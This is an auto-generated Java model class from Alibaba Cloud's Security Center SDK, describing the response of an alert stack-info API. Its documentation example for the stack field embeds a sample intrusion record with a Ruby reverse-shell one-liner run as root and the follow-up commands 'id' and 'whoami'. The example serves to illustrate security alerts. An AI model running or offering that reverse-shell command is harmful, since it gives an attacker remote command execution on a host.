// This file is auto-generated, don't edit it. Thanks.
package com.aliyun.sdk.service.sas20181203.models;

import com.aliyun.sdk.gateway.pop.*;
import darabonba.core.*;
import darabonba.core.async.*;
import darabonba.core.sync.*;
import darabonba.core.client.*;
import darabonba.core.RequestModel;
import darabonba.core.TeaModel;
import com.aliyun.sdk.gateway.pop.models.*;

/**
 * 
 * {@link DescribeAlarmEventStackInfoResponseBody} extends {@link TeaModel}
 *
 * <p>DescribeAlarmEventStackInfoResponseBody</p>
 */
public class DescribeAlarmEventStackInfoResponseBody extends TeaModel {
    @com.aliyun.core.annotation.NameInMap("RequestId")
    private String requestId;

    @com.aliyun.core.annotation.NameInMap("StackInfo")
    private String stackInfo;

    private DescribeAlarmEventStackInfoResponseBody(Builder builder) {
        this.requestId = builder.requestId;
        this.stackInfo = builder.stackInfo;
    }

    public static Builder builder() {
        return new Builder();
    }

    public static DescribeAlarmEventStackInfoResponseBody create() {
        return builder().build();
    }

    /**
     * @return requestId
     */
    public String getRequestId() {
        return this.requestId;
    }

    /**
     * @return stackInfo
     */
    public String getStackInfo() {
        return this.stackInfo;
    }

    public static final class Builder {
        private String requestId; 
        private String stackInfo; 

        /**
         * <p>The ID of the request.</p>
         * 
         * <strong>example:</strong>
         * <p>ECC6B3E3-D496-512D-B46D-E6996A6B63EE</p>
         */
        public Builder requestId(String requestId) {
            this.requestId = requestId;
            return this;
        }

        /**
         * <p>The stack information of the alert details.</p>
         * 
         * <strong>example:</strong>
         * <p>[ { &quot;child&quot;: [ { &quot;child&quot;: [ { &quot;child&quot;: [ ], &quot;data&quot;: { &quot;cmdline&quot;: &quot;id&quot;, &quot;proc_path&quot;: &quot;/bin/id&quot;, &quot;pid&quot;: &quot;[3033]&quot; }, &quot;description&quot;: { &quot;extend&quot;: [ ], &quot;main&quot;: { &quot;content&quot;: &quot;${pid} ${cmdline}&quot;, &quot;content_type&quot;: &quot;markdown&quot; } } }, { &quot;child&quot;: [ ], &quot;data&quot;: { &quot;cmdline&quot;: &quot;whoami&quot;, &quot;proc_path&quot;: &quot;/bin/whoami&quot;, &quot;pid&quot;: &quot;[3035]&quot; }, &quot;description&quot;: { &quot;extend&quot;: [ ], &quot;main&quot;: { &quot;content&quot;: &quot;${pid} ${cmdline}&quot;, &quot;content_type&quot;: &quot;markdown&quot; } } } ], &quot;data&quot;: { &quot;cmdline&quot;: &quot;/bin/bash -c &quot;id &amp;&amp; whoami&quot;&quot;, &quot;proc_path&quot;: &quot;/bin/bash&quot;, &quot;pid&quot;: &quot;[3022]&quot; }, &quot;description&quot;: { &quot;extend&quot;: [ ], &quot;main&quot;: { &quot;content&quot;: &quot;${pid} ${cmdline}&quot;, &quot;content_type&quot;: &quot;markdown&quot; } } } ], &quot;data&quot;: { &quot;src_ip&quot;: &quot;0.0.0.0&quot;, &quot;cmdline&quot;: &quot;ruby -rsocket -e exit if fork;c=TCPSocket.new(\&quot;0.0.0.0\&quot;,\&quot;1111\&quot;);while(cmd=c.gets);IO.popen(cmd,\&quot;r\&quot;){|io|c.print io.read}end&quot;, &quot;file&quot;: &quot;ruby&quot;, &quot;login_port&quot;: &quot;22&quot;, &quot;login_type&quot;: &quot;Password&quot;, &quot;proc_path&quot;: &quot;/usr/bin/ruby&quot;, &quot;dst_port&quot;: &quot;1111&quot;, &quot;pid&quot;: &quot;3011&quot;, &quot;user&quot;: &quot;root&quot;, &quot;dst_ip&quot;: &quot;0.0.0.0&quot;, &quot;log_time&quot;: &quot;2020-01-20 09:00:00&quot; }, &quot;description&quot;: { &quot;extend&quot;: [ { &quot;content&quot;: &quot;${tpl_netstat}&quot;, &quot;content_type&quot;: &quot;text&quot; } ], &quot;main&quot;: { &quot;content&quot;: &quot;${pid} ${cmdline}&quot;, &quot;content_type&quot;: &quot;markdown&quot; } } } ]</p>
         */
        public Builder stackInfo(String stackInfo) {
            this.stackInfo = stackInfo;
            return this;
        }

        public DescribeAlarmEventStackInfoResponseBody build() {
            return new DescribeAlarmEventStackInfoResponseBody(this);
        } 

    } 

}
